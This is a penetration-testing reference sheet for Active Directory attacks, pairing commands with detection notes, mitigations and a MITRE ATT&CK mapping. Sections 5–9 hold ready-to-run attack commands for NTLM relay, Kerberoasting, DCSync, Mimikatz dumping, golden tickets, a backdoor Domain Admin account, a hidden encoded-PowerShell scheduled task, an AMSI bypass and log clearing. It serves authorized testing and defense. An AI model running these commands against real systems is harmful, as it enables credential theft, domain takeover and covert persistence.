# Security Tooling Reference

A consolidated reference for reconnaissance, enumeration, Active Directory attack techniques, and defensive countermeasures. All techniques are for authorized lab and penetration testing use only.

---

## Table of Contents

1. [Reconnaissance and OSINT](#1-reconnaissance-and-osint)
2. [Network Enumeration](#2-network-enumeration)
3. [Web Enumeration](#3-web-enumeration)
4. [Service Enumeration](#4-service-enumeration)
5. [Active Directory Attacks](#5-active-directory-attacks)
6. [Post-Exploitation and Privilege Escalation](#6-post-exploitation-and-privilege-escalation)
7. [Domain Persistence](#7-domain-persistence)
8. [Lateral Movement](#8-lateral-movement)
9. [Defense Evasion](#9-defense-evasion)
10. [Defensive Mitigations](#10-defensive-mitigations)
11. [MITRE ATT&CK Mapping](#11-mitre-attck-mapping)
12. [Blue Team Detection Reference](#12-blue-team-detection-reference)
13. [Tool Matrix](#13-tool-matrix)
14. [Cleanup and Reporting](#14-cleanup-and-reporting)

---

## 1. Reconnaissance and OSINT

### Domain and IP Intelligence

```bash
# Whois lookup
whois example.com
whois 8.8.8.8
whois example.com | grep -i "organization"

# Batch lookups
for d in example.com test.com target.org; do whois $d >> batch_whois.txt; done
```

### Subdomain Enumeration

```bash
# Sublist3r
python sublist3r.py -d example.com
python sublist3r.py -d example.com -e google,yahoo,virustotal -o subdomains.txt

# Amass
amass enum -active -d example.com -o amass.txt
amass enum -brute -d example.com -src
amass intel -asn 13374 -whois
amass db -dir /tmp/amass -list
```

### Technology Fingerprinting

```bash
whatweb example.com
whatweb -v --log-xml=whatweb.xml example.com
```

### Internet-Wide Search

```bash
# Shodan
shodan init YOUR_API_KEY
shodan search apache
shodan host TARGET_IP
shodan search --fields ip_str,port,org --limit 10 exim

# Censys
censys search 'parsed.names: "example.com"'
censys view RESULT_ID
```

### Google Dorking

```
site:example.com filetype:pdf "confidential"
site:example.com inurl:admin
site:example.com intitle:intranet
```

### Email and Identity OSINT

```bash
# Metagoofil metadata extraction
metagoofil -d example.com -t pdf,doc,xls,ppt -l 100 -n 25 -o /tmp/meta -f report.html

# TheHarvester
theHarvester -d example.com -b google,bing,linkedin -f output.html
```

### Recon-ng

```bash
recon-ng
workspaces create target_ws
keys add shodan_api YOUR_KEY
marketplace install all
modules load hackertarget
options set SOURCE example.com
run
modules load reporting/html
options set CREATOR "Your Name"
run
```

---

## 2. Network Enumeration

### Host Discovery

```bash
# Network discovery
sudo netdiscover -i eth0 -r 192.168.1.0/24
nmap -sn 192.168.1.0/24

# Fast sweep
nmap -sn --min-rate 1000 192.168.1.0/24 -oN hosts.txt
```

### Nmap Scanning

```bash
# Service and version detection
nmap -sV -sC TARGET_IP
nmap -sV -sC -p- --min-rate 2000 TARGET_IP

# Specific scan types
nmap -sS TARGET_IP           # SYN scan
nmap -sT TARGET_IP           # TCP connect
nmap -sU -p 53,161,389 TARGET_IP  # UDP
nmap -O TARGET_IP            # OS detection

# Vuln scanning
nmap --script=vuln TARGET_IP

# Export for Metasploit
nmap -sS -oX scan.xml TARGET_IP
xsltproc scan.xml -o scan.html
```

### DNS Enumeration

```bash
# Zone transfer
dig axfr @TARGET_DNS example.com
fierce --domain example.com

# DNS records
nslookup example.com
dig example.com ANY
dig axfr @TARGET_DNS_SERVER example.com | tee zone_transfer.txt

# dnsrecon
dnsrecon -d example.com -n TARGET_DNS -a -z
```

### SMB and LDAP Enumeration

```bash
# SMB signing check (key for relay attacks)
nmap --script=smb2-security-mode.nse -p445 TARGET_IP -Pn

# SMB enumeration
smbclient -L //TARGET_IP -U username
enum4linux -a TARGET_IP

# LDAP
ldapsearch -H ldap://TARGET_IP -x -b "dc=domain,dc=local"
nmap -p 389 --script ldap-rootdse TARGET_IP
```

---

## 3. Web Enumeration

```bash
# Nikto
nikto -h http://TARGET_IP -output nikto.html

# Directory brute force
dirb http://TARGET_IP /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
ffuf -u http://TARGET_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# WordPress
wpscan --url example.com --enumerate u,p,t --api-token YOUR_TOKEN

# SQL injection
sqlmap -u "http://TARGET_IP/search?q=test" --batch --dbs
```

---

## 4. Service Enumeration

```bash
# FTP
nmap --script ftp-anon TARGET_IP
ftp TARGET_IP                 # Try anonymous login

# SSH
nmap -p 22 -sV TARGET_IP
ssh-audit TARGET_IP

# HTTP
curl -I http://TARGET_IP
nikto -h http://TARGET_IP

# MySQL
nmap --script mysql-info -p 3306 TARGET_IP
mysql -h TARGET_IP -u root -p

# MS-SQL
nmap --script ms-sql-info -p 1433 TARGET_IP
impacket-mssqlclient domain/user:pass@TARGET_IP -windows-auth
```

---

## 5. Active Directory Attacks

### LLMNR / NBT-NS Poisoning

LLMNR and NBT-NS broadcast when DNS fails. Responder intercepts and forces NTLM authentication.

```bash
# Start Responder
sudo responder -I eth0 -dwPv

# Crack captured NTLMv2 hashes
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt

# PowerShell alternative (on Windows)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -FileOutput Y
```

Detection: Event logs show unusual NTLM authentication. Disable LLMNR and NBT-NS via Group Policy.

### NTLM Relay

Requires SMB signing disabled on target hosts. Relay captured hashes to gain access.

```bash
# Find hosts without SMB signing
nmap --script=smb2-security-mode.nse -p445 TARGET_RANGE -Pn
nxc smb TARGET_RANGE --gen-relay-list relay_targets.txt

# Run relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
# or with SOCKS for reuse
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks

# Interactive shell via netcat
nc 127.0.0.1 11000
```

Detection: Monitor for SMB sessions without signing. Enforce SMB signing on all hosts.

### IPv6 DNS Takeover

```bash
# Abuse IPv6 autoconfiguration to intercept NTLM
mitm6 -d domain.local -i eth0

# Relay to LDAP
impacket-ntlmrelayx -6 -t ldaps://ip_dc -wh fakewpad.domain.local -l lootme
```

Detection: Monitor IPv6 traffic. Disable IPv6 if not required.

### AS-REP Roasting

Targets accounts with Kerberos pre-authentication disabled.

```bash
# No credentials required
impacket-GetNPUsers domain.local/ -dc-ip ip_dc \
  -usersfile users.txt \
  -format hashcat \
  -outputfile asrep_hashes.txt

# With credentials
impacket-GetNPUsers domain.local/user:pass \
  -dc-ip ip_dc -request -format hashcat

# Crack
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Rubeus (on Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

Detection: Monitor Event ID 4768. Audit accounts with pre-auth disabled.

### Kerberoasting

Requests TGS tickets for accounts with SPNs registered.

```bash
# Request all SPN tickets
impacket-GetUserSPNs domain.local/user:pass \
  -dc-ip ip_dc -request \
  -format hashcat \
  -outputfile kerberoast_hashes.txt

# Crack
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Rubeus (on Windows)
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /user:svc_sql /format:hashcat /outfile:hashes.txt

# Kerbrute user enumeration
kerbrute userenum -d domain.local --dc ip_dc users.txt
```

Detection: Monitor Event ID 4769 with encryption type 0x17 (RC4). Require AES for service accounts.

### LDAP Enumeration

```bash
# NetExec
nxc ldap ip_dc -u user -p pass --users
nxc ldap ip_dc -u user -p pass --groups
nxc ldap ip_dc -u user -p pass --computers

# ldapsearch
ldapsearch -x -H ldap://ip_dc \
  -D "user@domain.local" -w "pass" \
  -b "dc=domain,dc=local" \
  "(objectClass=user)" sAMAccountName memberOf

# Find SPNs
ldapsearch -x -H ldap://ip_dc \
  -D "user@domain.local" -w "pass" \
  -b "dc=domain,dc=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# AdFind (Windows)
AdFind.exe -b dc=domain,dc=local \
  -f "(&(objectcategory=person)(objectclass=user)(servicePrincipalName=*))" \
  servicePrincipalName
```

### BloodHound Collection

```bash
# Remote collection from Kali
bloodhound-python \
  -u user -p pass \
  -d domain.local \
  -dc ip_dc \
  -ns ip_dc \
  -c All \
  -zip

# Targeted collection (less noisy)
bloodhound-python \
  -u user -p pass \
  -d domain.local \
  -dc ip_dc \
  -c GroupMembership,LocalAdmin,Sessions

# SharpHound (on Windows)
.\SharpHound.exe --CollectionMethod All --Domain domain.local

# Key BloodHound Cypher queries
# Shortest path to DA
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# ACL attack paths
MATCH p=(u:User)-[r:Owns|GenericAll|WriteDacl|WriteOwner|GenericWrite]->(g:Group) RETURN p
```

Detection: Monitor for unusual LDAP query volume and patterns.

### Pass-the-Hash

```bash
# NetExec SMB
nxc smb TARGET_IP -u administrator -H NTHASH --local-auth

# Evil-WinRM
evil-winrm -i TARGET_IP -u Administrator -H NTHASH

# Impacket tools
psexec.py -hashes :NTHASH administrator@TARGET_IP
wmiexec.py -hashes :NTHASH administrator@TARGET_IP
secretsdump.py -hashes :NTHASH administrator@TARGET_IP
```

Detection: Event ID 4624 with logon type 9. Enable Protected Users group, require AES Kerberos.

### Constrained Delegation Abuse

```bash
# Find delegation configurations
nxc ldap ip_dc -u user -p pass -M find-delegation

# Request impersonated service ticket
impacket-getST domain.local/service_account \
  -spn cifs/ip_dc \
  -impersonate Administrator \
  -dc-ip ip_dc

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass administrator@dc.domain.local
```

Detection: Monitor Event ID 4769. Audit service accounts with delegation enabled.

---

## 6. Post-Exploitation and Privilege Escalation

### DCSync

Replicates all domain credential hashes. Requires DS-Replication-Get-Changes rights.

```bash
# Full dump
impacket-secretsdump domain.local/labadmin:pass@ip_dc -just-dc-ntlm

# Target specific user
impacket-secretsdump domain.local/Administrator@ip_dc -just-dc-user krbtgt

# PowerView (on Windows)
Import-Module .\PowerView.ps1
Invoke-DCSync -PWDumpFormat -Users @("Administrator", "krbtgt")
```

Detection: Event ID 4662 with DS-Replication-Get-Changes-All property.

### Token Impersonation

```bash
# In Meterpreter
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"

# RottenPotato (Windows)
.\RottenPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
```

Detection: Event ID 4672 (privilege use). Monitor for unusual token elevation.

### Credential Dumping

```bash
# Mimikatz (in Meterpreter or direct)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH

# LaZagne
python3 laZagne.py all

# Remote LSASS dump via NetExec
nxc smb TARGET_IP -u admin -H HASH -M lsassy
```

Detection: Monitor for LSASS access. Deploy Credential Guard.

### Persistence

```bash
# Backdoor user
net user /add backdooruser P@ssw0rd123! /domain
net group "Domain Admins" backdooruser /ADD /DOMAIN

# Scheduled task
schtasks /create /tn "WindowsUpdate" \
  /tr "powershell -w hidden -enc BASE64_PAYLOAD" \
  /sc minute /mo 10 /ru SYSTEM

# ACL backdoor (PowerView)
Add-ObjectAcl -TargetIdentity "Domain Admins" \
  -PrincipalIdentity backdooruser -Rights All
```

Detection: Event ID 4720 (user created), 4732 (group membership), 4698 (scheduled task).

---

## 7. Domain Persistence

### Golden Ticket

Forged TGT signed with krbtgt hash. Valid for any service in the domain.

```bash
# Get domain SID
impacket-lookupsid domain.local/user:pass@ip_dc | grep "Domain SID"

# Forge ticket (Mimikatz)
mimikatz # kerberos::golden \
  /user:Administrator \
  /domain:domain.local \
  /sid:S-1-5-21-XXXXXX \
  /krbtgt:KRBTGT_HASH \
  /ptt

# Impacket
impacket-ticketer \
  -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-XXXXXX \
  -domain domain.local \
  administrator

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass administrator@dc.domain.local
```

Detection: Monitor Kerberos tickets with abnormal lifetimes or encryption types.

### Silver Ticket

Forged TGS for a specific service using the service/machine account hash.

```bash
impacket-ticketer \
  -nthash SERVICE_ACCOUNT_HASH \
  -domain-sid S-1-5-21-XXXXXX \
  -domain domain.local \
  -spn cifs/TARGET.domain.local \
  administrator

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass administrator@TARGET.domain.local
```

### Domain Trust Attacks

```bash
# Enumerate trusts
nltest /domain_trusts /all_trusts /v

# Request TGT from trusted domain
impacket-getTGT domain.local/user:pass

# Inter-realm trust exploitation
impacket-ticketer \
  -nthash TRUST_KEY \
  -domain-sid S-1-5-21-PARENT \
  -extra-sid S-1-5-21-CHILD-519 \
  -domain domain.local \
  administrator
```

Detection: Monitor cross-domain authentication. Enforce SID filtering.

---

## 8. Lateral Movement

### WMI Execution

```bash
# Impacket
impacket-wmiexec domain/user:pass@TARGET_IP "whoami"

# WinRM
evil-winrm -i TARGET_IP -u Administrator -p Password123
evil-winrm -i TARGET_IP -u Administrator -H NTHASH
```

Detection: Event ID 4688 with remote process creation from WMI.

### Scheduled Tasks

```bash
# Create remote task
schtasks /create /s TARGET_IP /u domain\user /p pass \
  /tn "Update" /tr "cmd.exe /c whoami" /sc once /st 00:00
schtasks /run /s TARGET_IP /tn "Update"
```

Detection: Event ID 4698 (scheduled task created).

### DCOM Lateral Movement

```powershell
$com = [activator]::CreateInstance(
  [type]::GetTypeFromProgID("MMC20.Application", "TARGET_IP"))
$com.Document.ActiveView.ExecuteShellCommand(
  "cmd.exe", $null, "/c whoami", "7")
```

Detection: Monitor DCOM activation events and remote code execution patterns.

### Pass-the-Ticket

```bash
impacket-getTGT domain.local/user:pass
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass user@dc.domain.local
```

---

## 9. Defense Evasion

### Log Clearing

```powershell
# Clear event logs (highly detectable)
wevtutil cl Security
wevtutil cl System

# Export before clearing (defensive use)
wevtutil epl Security C:\Audit\security_backup.evtx
```

Detection: Event ID 1102 (log cleared). Implement WEF/SIEM to forward logs offsite.

### AMSI Bypass

```powershell
# Basic bypass (noisy — detected by most modern EDRs)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
  'amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Note: Modern EDRs detect this immediately. Real engagements require more sophisticated techniques.

Detection: Monitor for suspicious PowerShell execution patterns and AMSI bypass attempts.

### Parent Process Spoofing

```bash
mimikatz # process::spoof /parent:explorer.exe /child:backdoor.exe
```

Detection: Monitor for abnormal parent-child process relationships via Sysmon Event ID 1.

---

## 10. Defensive Mitigations

### Network

- Disable LLMNR and NBT-NS via Group Policy
- Enforce SMB signing on all endpoints
- Enable LDAP signing and channel binding
- Monitor IPv6 configuration
- Implement strict firewall rules for AD ports

### Authentication

- Deploy LAPS (Local Administrator Password Solution)
- Enable Credential Guard on Windows 10/11
- Require Kerberos AES encryption (disable RC4)
- Enable Protected Users security group
- Implement multi-factor authentication for privileged accounts

### Monitoring

- Configure Windows Event Forwarding (WEF)
- Deploy Sysmon with a hardened configuration (SwiftOnSecurity or Olaf Hartong)
- Centralize logging in a SIEM
- Establish baseline authentication patterns
- Alert on unusual Kerberos activity (RC4 tickets, long-lived tickets)

### Administrative Controls

- Implement Just Enough Administration (JEA)
- Enforce principle of least privilege
- Rotate service account passwords regularly
- Audit ACLs on sensitive AD objects regularly
- Implement tiered administration model (Tier 0/1/2)
- Rotate krbtgt password every 30 days

---

## 11. MITRE ATT&CK Mapping

| Technique | ID | Tools | Detection |
|---|---|---|---|
| LLMNR/NBT-NS Poisoning | T1557.001 | Responder, Inveigh | Network monitoring, disable LLMNR |
| SMB Relay | T1557.002 | ntlmrelayx | SMB signing logs, 4624 events |
| Kerberoasting | T1558.003 | GetUserSPNs, Rubeus | 4769 events with type 0x17 |
| AS-REP Roasting | T1558.004 | GetNPUsers | Pre-auth disabled monitoring, 4768 |
| Pass-the-Hash | T1550.002 | NetExec, Mimikatz | 4624 logon type 9 |
| Token Impersonation | T1134.001 | Incognito, RottenPotato | 4672 events |
| DCSync | T1003.006 | secretsdump, Mimikatz | 4662 DS-Replication rights |
| Golden Ticket | T1558.001 | Mimikatz, ticketer | Abnormal Kerberos ticket lifetimes |
| Silver Ticket | T1558.002 | Mimikatz, ticketer | Service ticket anomalies |
| Lateral Movement | T1021 | PsExec, WMI, WinRM | 4688 remote process creation |
| Persistence | T1136 | net user, schtasks | 4720, 4732, 4698 events |
| BloodHound Collection | T1087 | bloodhound-python | Unusual LDAP query volume |
| Credential Dumping | T1003.001 | Mimikatz, lsassy | LSASS access monitoring |

---

## 12. Blue Team Detection Reference

### Key Windows Event IDs

| Event ID | Description | Attack Relevance |
|---|---|---|
| 4624 | Successful logon | PtH (type 9), unusual hours |
| 4625 | Failed logon | Spray, brute force |
| 4662 | Object access | DCSync (DS-Replication rights) |
| 4668 | Kerberos TGT request | AS-REP roasting |
| 4769 | Kerberos service ticket | Kerberoasting (RC4 type 0x17) |
| 4672 | Special privileges assigned | Token impersonation |
| 4688 | Process created | Lateral movement, evasion |
| 4698 | Scheduled task created | Persistence |
| 4720 | User account created | Backdoor accounts |
| 4732 | Member added to group | Privilege escalation |
| 1102 | Audit log cleared | Cleanup, evasion |

### Sysmon Key Event IDs

| Event ID | Description |
|---|---|
| 1 | Process creation (with parent) |
| 3 | Network connection |
| 7 | Image/DLL loaded |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (LSASS monitoring) |
| 11 | File created |
| 12/13 | Registry events |
| 22 | DNS query |

### Behavioral Detection Rules

**Kerberoasting detection:**
```
Event ID 4769 WHERE Ticket_Encryption_Type = 0x17 AND NOT Account_Name ENDS WITH "$"
```

**DCSync detection:**
```
Event ID 4662 WHERE Access_Mask = 0x100 AND Properties CONTAINS "DS-Replication-Get-Changes-All"
```

**Pass-the-Hash detection:**
```
Event ID 4624 WHERE Logon_Type = 9 AND Authentication_Package = "NTLM"
```

**Suspicious scheduled task:**
```
Event ID 4698 WHERE Task_Content CONTAINS "powershell" OR "cmd" OR "wscript"
```

---

## 13. Tool Matrix

| Phase | Purpose | Primary | Secondary |
|---|---|---|---|
| Recon | Domain and IP intelligence | whois, amass, shodan | theHarvester, censys |
| Host discovery | Network sweep | nmap, netdiscover | masscan, fping |
| DNS | Zone transfer, brute force | dig, dnsrecon, fierce | dnsx, amass |
| Web | Directory and vuln scan | nikto, gobuster, ffuf | dirb, nuclei |
| Poisoning | NTLM hash capture | Responder, mitm6 | Inveigh, bettercap |
| Relay | Authentication abuse | ntlmrelayx | MultiRelay |
| Enumeration | AD object discovery | ldapsearch, BloodHound | PowerView, AdFind |
| Credential attacks | Hash extraction | secretsdump, Mimikatz | LaZagne, pypykatz |
| Lateral movement | Host-to-host | NetExec, psexec.py, WMI | evil-winrm, DCOM |
| Persistence | Long-term access | schtasks, net user | SharPersist |
| Evasion | Avoid detection | AMSI bypass, process spoof | Phantom DLL |

---

## 14. Cleanup and Reporting

### Cleanup Checklist

```bash
# Remove backdoor users
net user backdooruser /delete /domain

# Delete scheduled tasks
schtasks /delete /tn "WindowsUpdate" /f

# Remove registry persistence
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysHelper" /f

# Restore ACLs (PowerView)
Remove-DomainObjectAcl -TargetIdentity "Domain Admins" \
  -PrincipalIdentity backdooruser -Rights All

# Verify cleanup with Autoruns
.\Autoruns64.exe -accepteula -a * -c -s -h
```

### Pentest Checklist

- Scope and authorization confirmed
- LLMNR/NBT-NS tested and documented
- SMB signing validated across all hosts
- NTLM relay attempted and documented
- Kerberoasting executed with enumeration
- AS-REP roasting against identified accounts
- BloodHound analysis completed
- ACL enumeration completed
- Delegation configurations reviewed
- Domain trust relationships examined
- Privilege escalation vectors tested
- Domain compromise demonstrated
- Persistence established and removed
- Cleanup verified
- Report written with reproduction steps
- Defensive recommendations provided

### Report Structure

1. Executive Summary — business impact in plain language
2. Scope and Methodology
3. Findings — ranked by severity (Critical / High / Medium / Low)
4. Attack Chain — step-by-step narrative with evidence
5. MITRE ATT&CK Mapping table
6. Defensive Recommendations — specific, actionable, prioritized
7. Appendices — raw output, tool versions, timeline

---

## Disclaimer

All techniques in this reference are for authorized penetration testing and security research only. Do not use against systems you do not own or have explicit written authorization to test.
